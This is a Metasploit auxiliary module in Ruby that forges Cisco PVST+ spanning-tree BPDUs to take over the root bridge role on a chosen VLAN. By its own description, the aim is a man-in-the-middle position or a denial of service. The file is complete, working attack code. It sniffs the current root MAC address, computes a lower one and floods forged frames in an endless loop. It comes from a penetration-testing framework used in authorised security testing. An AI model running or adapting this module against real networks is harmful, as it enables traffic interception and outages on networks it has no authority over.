##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

#begin auxiliary/spoof/cisco/pvstp.rb
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Capture

	def initialize
		super(
			'Name'           => 'Forge Cisco PVSTP+ BPDUs',
			'Description'    => %q{
				This module forges Per-VLAN Spanning-Tree BPDUs to claim
				the Root role.  PVST(+) is the Cisco default for use on switches.
				This will either result in a MiTM or a DOS.  You need to set
				the RMAC field to a MAC address lower than the current root
				bridge (hint: use wireshark) or use AUTO to sniff and generate one.
			},
			'Author'         => [ 'Spencer McIntyre' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'Actions'     =>
				[
					[ 'Service' ]
				],
			'PassiveActions' =>
				[
					'Service'
				],
			'DefaultAction'  => 'Service'
		)

		begin
			require 'pcaprub'
			@@havepcap = true
		rescue ::LoadError
			@@havepcap = false
		end

		register_options([
			OptString.new('RMAC', [ false, "The Root MAC To Spoof", '00:00:00:00:00:00']),
			OptBool.new('AUTO', [ true, "Automatically Guess A Lower Root MAC", true]),
			OptInt.new('VID', [ true, "The Target VLAN Identifier", 1]),
			OptString.new('INTERFACE', [true, "The name of the interface", 'eth0'])
		])

		deregister_options('FILTER','PCAPFILE','RHOST','SNAPLEN','TIMEOUT','UDP_SECRET', 'NETMASK', 'GATEWAY')
		register_advanced_options([
			OptInt.new('MaxAge', [ true, "The amount of time a switch will retain a BPDU's contents before discarding it.", 20]),
			OptInt.new('HelloTime', [ true, "The interval between BPDUs.", 2]),
			OptInt.new('ForwardDelay', [ true, "The time spent in the listening and learning states.", 15]),
			OptInt.new('Wait', [ true, "The amount of time to sniff for a PVSTP+ BPDU to guess the root MAC", 15]),
		])
	end

	def run
		@auto = false
		if (datastore['AUTO'].to_s.match(/^(t|y|1)/i))
			@auto = true
		end
		if datastore['VID'] > 4094
			print_error('stp: VLAN ID is to high (greater than 4094)')
			return 0
		end
		if @auto # Note that this can hang forever
			raise "Pcaprub is not available" if not @@havepcap
			open_pcap({'FILTER' => 'ether dst 01:00:0c:cc:cc:cd'})
			pcap = self.capture
			begin
				Timeout.timeout(datastore['Wait'].to_i) do
					pcap.each do |r|
						eth = Racket::L2::Ethernet.new(r)
						if eth.ethertype == 0x8100
							@dot1q = true
							vlan = Racket::L2::VLAN.new( eth.payload )
							next if not vlan.id == datastore['VID']
							llc = Racket::L2::LLC.new( vlan.payload )
						else
							@dot1q = false
							llc = Racket::L2::LLC.new( eth.payload )
						end

						stp = Racket::L3::STP.new( llc.payload[5, llc.payload.length] )
						next if not stp.root_wtf.to_s(2)[4 .. 16].to_i(2)

						@rmac = stp.root_id	#the following 8 lines make sure the MAC is lower so we can steal the root
						$i = 9;
						until (@rmac.to_s[$i .. ($i + 1)].hex - 1) > 0 do
							if $i == 0
								next
							end
							$i = $i - 3
						end
						tmp = (@rmac.to_s[$i .. ($i + 1)].hex - 1)
						if tmp < 16
							@rmac = @rmac[0 .. ($i - 1)] + '0' + tmp.to_s(16) + @rmac[($i + 2) .. 16]
						else
							@rmac = @rmac[0 .. ($i - 1)] + tmp.to_s(16) + @rmac[($i + 2) .. 16]
						end
						break
					end
				end
			rescue Timeout::Error
				print_error('stp: Could Not Find PVSTP+ Instance With Specified VLAN, Now Exiting')
				return 0
			end
		end
		###
		@run = true
		n = Racket::Racket.new
		helloTime = datastore['HelloTime'].to_i
		forwardDelay = datastore['ForwardDelay'].to_i
		maxAge = datastore['MaxAge'].to_i

		n.l2 = Racket::L2::Ethernet.new()
		if @auto
			src_mac = @rmac.to_s[0 .. 15]
			src_mac << (16 + rand(238)).to_s(16)
			n.l2.src_mac = src_mac
		else
			@rmac = datastore['RMAC']
			if @rmac.length != 17
				print_error('stp: Invalid Field RMAC')
				return 0
			end
			n.l2.src_mac = @rmac
			@rmac = @rmac.to_s[0 .. 15] << '00'
		end
		n.l2.dst_mac = '01:00:0c:cc:cc:cd'			# this has to stay the same
		if @dot1q
			n.l2.ethertype = 0x8100					# 802.1Q
			eight_oh_two_q_priority = 0b111 * (2 ** 13)
			eight_oh_two_q_cfi = 0b0 * (2 ** 12)
			eight_oh_two_id = datastore['VID']
			n.l2.payload = [ eight_oh_two_q_priority + eight_oh_two_q_cfi + eight_oh_two_id ].pack("n") + "\x00\x32"
		else
			n.l2.ethertype = 0x0032
		end

		n.l4 = Racket::L2::LLC.new()
		n.l4.control = 0x03
		n.l4.dsap = 0xaa
		n.l4.ssap = 0xaa
		payload = "\x00\x00\x0c"					# Cisco vendor code
		payload << "\x01\x0b"						# pid 010b is PVSTP+
		n.l4.payload = payload

		n.l5 = Racket::L3::STP.new()
		n.l5.protocol = 0x0000
		n.l5.version = 0x00
		n.l5.bpdu_type = 0x00
		n.l5.root_id = @rmac
		n.l5.root_wtf = ( 0b1000 * (2 ** 12)) + datastore['VID']
		n.l5.root_cost = 0x0000
		n.l5.bridge_id = @rmac
		n.l5.bridge_wtf = ( 0b1000 * (2 ** 12)) + datastore['VID']
		n.l5.port_id = 0x8001
		n.l5.msg_age = 0x0000
		n.l5.max_age = maxAge * 256
		n.l5.hello_time = helloTime * 256
		n.l5.forward_delay = forwardDelay * 256
		n.l5.payload = "\x00\x00\x00\x02" << [ datastore['VID'] ].pack("n")

		n.iface = datastore['INTERFACE']
		n.pack()
		print_debug "n: #{n.inspect}"
		print_debug "n: #{n.pack.inspect}"

		while @run
			n.send2()
			select(nil, nil, nil, helloTime)
		end

	end

end
